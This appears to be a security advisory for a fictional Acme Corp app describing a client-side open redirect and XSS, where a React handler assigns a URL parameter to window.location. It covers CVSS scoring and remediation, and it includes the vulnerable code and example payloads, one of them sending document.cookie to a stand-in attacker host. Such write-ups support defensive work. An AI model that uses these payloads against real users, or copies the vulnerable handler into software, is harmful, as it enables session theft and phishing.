# Client-Side Open Redirect and XSS via Unvalidated Redirection

# Vulnerability Case
During our assessment of Acme Corp's web application, we observed that a client-side redirection function directly assigns a user-controlled parameter, `$PROP`, to the browser's `window.location` without proper input validation. This flaw was initially identified during manual code reviews and subsequently confirmed through injection testing, where crafted JavaScript URI payloads triggered unintended redirects and script execution. The vulnerability can be exploited as an open-redirect, enabling attackers to reroute users to malicious sites, or as an XSS vector, allowing execution of arbitrary JavaScript code. The affected technology stack includes JavaScript frontends such as React.js running on a Node.js environment.

```javascript
// Vulnerable redirection function within a React component
function handleRedirect() {
  // Retrieve user-controlled input from URL parameters
  const params = new URLSearchParams(window.location.search);
  const redirectUrl = params.get("$PROP");

  // No validation/sanitization is performed on the user input
  if (redirectUrl) {
    // Direct assignment vulnerable to open-redirect and XSS via JavaScript URIs
    window.location = redirectUrl;
  }
}
```

The vulnerability arises from the absence of input validation, allowing an attacker to supply a malicious value to `$PROP`. By injecting a JavaScript URI (e.g., `javascript:alert('XSS')`), an adversary can trigger Cross-Site Scripting, executing arbitrary code in the context of the victim’s browser. Alternatively, supplying an external URL facilitates an open-redirect that can be leveraged for phishing, credential theft, or session hijacking. This exploitation pathway poses severe business risks by undermining user trust and potentially serving as a precursor to more advanced attacks within the enterprise environment.


context: javascript.browser.security.open-redirect.js-open-redirect The application accepts potentially user-controlled input `$PROP` which can control the location of the current window context. This can lead two types of vulnerabilities open-redirection and Cross-Site-Scripting (XSS) with JavaScript URIs. It is recommended to validate user-controllable input before allowing it to control the redirection.

# Vulnerability Breakdown
This vulnerability involves the direct assignment of user-controlled input to window.location without proper validation, creating dual attack vectors through both open redirect and XSS.

1. **Key vulnerability elements**:
   - User-controlled parameter `$PROP` directly assigned to `window.location`
   - No input validation or sanitization before redirection
   - Affects React.js frontend running on Node.js
   - Allows both external URL redirects and JavaScript URI execution
   - Client-side vulnerability requiring user interaction

2. **Potential attack vectors**:
   - Malicious external URLs causing redirection to phishing sites
   - JavaScript URI schemes (e.g., `javascript:alert('XSS')`) executing arbitrary code
   - Social engineering through crafted links sent via email or messaging
   - Potential session hijacking or credential theft

3. **Severity assessment**:
   - Requires user interaction (clicking a malicious link)
   - Network-accessible attack vector (can be exploited remotely)
   - Low complexity to execute (simple URL parameter manipulation)
   - No privileges required to execute the attack
   - Primary impact on integrity through potential redirection to malicious sites

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Network (N) 
   - Attack Complexity (AC): Low (L) 
   - Privileges Required (PR): None (N) 
   - User Interaction (UI): Required (R) 
   - Scope (S): Unchanged (U)
   - Confidentiality (C): None (N) 
   - Integrity (I): Low (L) 
   - Availability (A): None (N) 

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N

# Description
A client-side open redirect and XSS vulnerability exists in Acme Corp's web application within a React.js component. The vulnerable code directly assigns a user-controlled parameter (`$PROP`) to `window.location` without proper validation or sanitization:

```javascript
function handleRedirect() {
  // Retrieve user-controlled input from URL parameters
  const params = new URLSearchParams(window.location.search);
  const redirectUrl = params.get("$PROP");

  // No validation/sanitization is performed on the user input
  if (redirectUrl) {
    // Direct assignment vulnerable to open-redirect and XSS via JavaScript URIs
    window.location = redirectUrl;
  }
}

```

This vulnerability creates two attack vectors:

1. **Open Redirect**: Attackers can provide an external URL as the `$PROP` parameter, causing the application to redirect users to potentially malicious websites. This enables phishing attacks where users believe they're interacting with a legitimate application.

2. **Cross-Site Scripting (XSS)**: By supplying a JavaScript URI (e.g., `javascript:alert('XSS')`) as the `$PROP` parameter, attackers can execute arbitrary JavaScript code in the victim's browser context, potentially leading to session hijacking, credential theft, or other client-side attacks.

# CVSS
**Score**: 4.3 \
**Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N \
**Severity**: Medium

The Medium severity rating (4.3) is based on the following factors:

- **Network Attack Vector (AV:N)**: The vulnerability can be exploited remotely over the internet by anyone who can craft a malicious URL.

- **Low Attack Complexity (AC:L)**: The vulnerability is straightforward to exploit, requiring only basic understanding of URL parameters and JavaScript URIs.

- **No Privileges Required (PR:N)**: The attacker doesn't need any authentication or special privileges to exploit the vulnerability.

- **User Interaction Required (UI:R)**: Exploitation depends on a user clicking a malicious link containing the crafted parameter, which is a mitigating factor.

- **Unchanged Scope (S:U)**: The vulnerability affects only the vulnerable web application and doesn't allow impact on other components.

- **No Confidentiality Impact (C:N)**: While potential for information disclosure exists via subsequent phishing, the vulnerability itself doesn't directly expose sensitive information.

- **Low Integrity Impact (I:L)**: The primary impact is on integrity through unintended redirections to malicious websites or execution of attacker-controlled JavaScript.

- **No Availability Impact (A:N)**: The vulnerability doesn't significantly impact the availability of the application.

# Exploitation Scenarios
**Scenario 1: Phishing Attack via Open Redirect**
An attacker crafts a malicious URL targeting Acme Corp's web application: `https://acme-corp.com/app?$PROP=https://malicious-site.com/fake-login`. The attacker distributes this link via email, social media, or other channels. When users click the link, they initially see the legitimate Acme Corp domain in their browser, establishing trust. The vulnerable code then redirects them to the malicious site, which mimics Acme Corp's login page. Unsuspecting users enter their credentials, which are captured by the attacker.

**Scenario 2: Session Hijacking via XSS**
An attacker creates a URL with a JavaScript URI payload: `https://acme-corp.com/app?$PROP=javascript:fetch('https://attacker.com/steal?cookie='+document.cookie)`. When a victim with an active session clicks this link, the JavaScript executes in their browser context, sending their session cookies to the attacker's server. The attacker can then use these cookies to impersonate the victim and gain unauthorized access to their account.

**Scenario 3: Two-Stage Attack**
An attacker targets specific employees with access to sensitive information. They first craft a URL with an XSS payload that identifies vulnerable browsers: `https://acme-corp.com/app?$PROP=javascript:if(isVulnerableBrowser()){location='https://attacker.com/stage2?id='+userFingerprint()}`. For vulnerable targets, this initial reconnaissance redirects to a second stage that delivers a more sophisticated payload tailored to the victim's specific browser environment, maximizing the attack's effectiveness.

# Impact Analysis
**Business Impact:**
- Damage to brand reputation if users are redirected to malicious or inappropriate sites
- Potential loss of customer trust when users realize the application can be manipulated to redirect them
- Legal liability if user data is compromised through secondary attacks enabled by XSS
- Increased customer support costs dealing with reports of suspicious redirects
- Possible regulatory implications if the vulnerability contributes to a data breach

**Technical Impact:**
- Enables phishing attacks that can lead to credential theft and account compromise
- Allows execution of arbitrary JavaScript in users' browsers through XSS
- Potential for session hijacking by stealing cookies or authentication tokens
- Risk of client-side data exfiltration from browser storage
- Could serve as an entry point for more sophisticated client-side attacks
- May enable attackers to perform actions on behalf of victims through the captured sessions
- Creates a vector for distributing malware through redirects to malicious download sites

# Technical Details
The vulnerability occurs in a React.js component that handles redirection functionality, where user input from URL parameters is directly assigned to `window.location` without validation:

```javascript
function handleRedirect() {
  // Retrieve user-controlled input from URL parameters
  const params = new URLSearchParams(window.location.search);
  const redirectUrl = params.get("$PROP");

  // No validation/sanitization is performed on the user input
  if (redirectUrl) {
    // Direct assignment vulnerable to open-redirect and XSS via JavaScript URIs
    window.location = redirectUrl;
  }
}

```

**Exploitation Mechanics:**

1. **Open Redirect Attack**:
   - The attacker crafts a URL with the `$PROP` parameter set to an external website:
     `https://acme-corp.com/app?$PROP=https://malicious-site.com`
   - When a user clicks this link, the application executes `window.location = "https://malicious-site.com"`
   - The browser navigates to the malicious site, potentially a phishing page mimicking Acme Corp

2. **XSS via JavaScript URI**:
   - The attacker uses a JavaScript URI scheme in the `$PROP` parameter:
     `https://acme-corp.com/app?$PROP=javascript:alert(document.domain)`
   - When a user accesses this URL, the application executes `window.location = "javascript:alert(document.domain)"`
   - Instead of navigating to a new page, the browser executes the JavaScript code in the current context

**Root Cause Analysis:**

The fundamental issue is the direct assignment of unvalidated user input to a sensitive sink (`window.location`). Two specific security problems make this vulnerability possible:

1. **Missing URL Validation**: The code doesn't verify that `redirectUrl` points to a trusted domain or contains a safe protocol

2. **JavaScript URI Handling**: Browsers interpret values assigned to `window.location` that begin with `javascript:` as executable code rather than navigation targets

This vulnerability is particularly dangerous because:

- It requires minimal technical expertise to exploit
- It can be leveraged for both phishing and XSS attacks
- The initial URL appears legitimate, increasing the likelihood of user interaction
- Client-side redirects like this often bypass web application firewalls and other security controls

# Remediation Steps
## Implement URL Validation

**Priority**: P0

Modify the redirection handler to validate URLs before assigning them to window.location:

```javascript
function handleRedirect() {
  const params = new URLSearchParams(window.location.search);
  const redirectUrl = params.get("$PROP");
  
  if (redirectUrl && isValidRedirectUrl(redirectUrl)) {
    window.location = redirectUrl;
  } else {
    // Fallback to a default page or show an error
    window.location = "/home";
  }
}

function isValidRedirectUrl(url) {
  // Method 1: Whitelist approach (most secure)
  const allowedDomains = [
    "acme-corp.com",
    "support.acme-corp.com",
    "dashboard.acme-corp.com"
  ];
  
  try {
    // Use the URL constructor to parse and validate the URL
    const parsedUrl = new URL(url);
    
    // Reject javascript: and data: URLs to prevent XSS
    if (parsedUrl.protocol === "javascript:" || 
        parsedUrl.protocol === "data:" ||
        parsedUrl.protocol === "vbscript:") {
      return false;
    }
    
    // Only allow specific domains (whitelist approach)
    return allowedDomains.some(domain => 
      parsedUrl.hostname === domain ||
      parsedUrl.hostname.endsWith(`.${domain}`));
  } catch (e) {
    // If URL parsing fails, check if it's a relative URL
    return url.startsWith("/") && !url.startsWith("//");
  }
}

```

This implementation provides robust protection by:
1. Explicitly rejecting dangerous protocols like javascript: that enable XSS
2. Using a whitelist approach to restrict redirections to trusted domains
3. Properly handling relative URLs while preventing protocol-relative URLs (those starting with //)
## Implement Indirect Redirection Pattern

**Priority**: P1

Replace direct assignments to window.location with an indirect redirection pattern:

```javascript
function handleRedirect() {
  const params = new URLSearchParams(window.location.search);
  const redirectId = params.get("$PROP");
  
  // Use a lookup table or API to map IDs to actual URLs
  const redirectMap = {
    "dashboard": "/dashboard",
    "profile": "/user/profile",
    "settings": "/user/settings",
    "help": "https://support.acme-corp.com/help"
  };
  
  // Only redirect to pre-defined destinations
  if (redirectId && redirectMap.hasOwnProperty(redirectId)) {
    window.location = redirectMap[redirectId];
  } else {
    // Default destination
    window.location = "/home";
  }
}

```

This pattern eliminates the vulnerability by:
1. Never directly using user input for redirection
2. Using a server-controlled mapping between identifiers and actual URLs
3. Restricting possible redirection targets to a predefined set

For external URLs that can't be predetermined, implement a server-side redirection endpoint:

```javascript
function handleExternalRedirect() {
  const targetUrl = encodeURIComponent(externalUrl);
  // Redirect through a server-side endpoint that performs validation
  window.location = `/redirect?url=${targetUrl}`;
}

```

The server-side endpoint performs thorough validation before redirecting users.


# References
* CWE-601 | [URL Redirection to Untrusted Site ('Open Redirect')](https://cwe.mitre.org/data/definitions/601.html)
* CWE-79 | [Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
